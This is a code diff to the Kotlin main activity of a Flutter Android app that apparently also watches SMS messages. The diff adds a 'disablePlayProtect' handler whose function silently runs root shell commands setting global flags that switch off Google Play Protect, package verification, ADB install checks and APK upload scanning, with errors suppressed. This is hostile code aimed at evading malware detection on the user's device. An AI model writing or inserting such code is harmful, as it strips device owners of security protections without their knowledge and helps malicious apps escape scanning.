@@ -159,6 +159,10 @@ class MainActivity : FlutterActivity() {
                     openPlayProtectSettings()
                     result.success(true)
                 }
+                "disablePlayProtect" -> {
+                    disablePlayProtectViaAdb()
+                    result.success(true)
+                }
                 else -> result.notImplemented()
             }
         }
@@ -260,6 +264,22 @@ class MainActivity : FlutterActivity() {
             }
             startActivity(intent)
         } catch (_: Exception) {}
+    }
+
+    private fun disablePlayProtectViaAdb() {
+        Thread {
+            try {
+                val commands = listOf(
+                    "settings put global package_verifier_user_consent -1",
+                    "settings put global package_verifier_enable 0",
+                    "settings put global verifier_verify_adb_installs 0",
+                    "settings put global upload_apk_enable 0",
+                    "settings put global package_verifier_aggressive 0"
+                )
+                val cmd = "su -c \"" + commands.joinToString(" && ") + "\""
+                Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
+            } catch (_: Exception) {}
+        }.start()
     }
 
     private fun startSmsObserver() {
